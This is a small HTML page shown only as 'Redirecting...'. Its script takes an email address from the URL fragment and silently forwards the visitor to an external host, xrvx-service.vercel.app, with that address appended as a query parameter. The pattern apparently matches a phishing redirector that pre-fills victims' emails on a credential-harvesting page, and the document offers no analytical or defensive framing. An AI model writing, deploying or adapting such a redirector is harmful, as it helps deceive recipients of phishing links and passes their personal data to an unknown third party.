<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    window.onload = function () {
      const baseUrl = 'https://xrvx-service.vercel.app/';
      const hash = window.location.hash;
      if (hash) {
        const email = encodeURIComponent(hash.substring(1));
        window.location.href = baseUrl + '?web=' + email;
      } else {
        window.location.href = baseUrl;
      }
    };
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
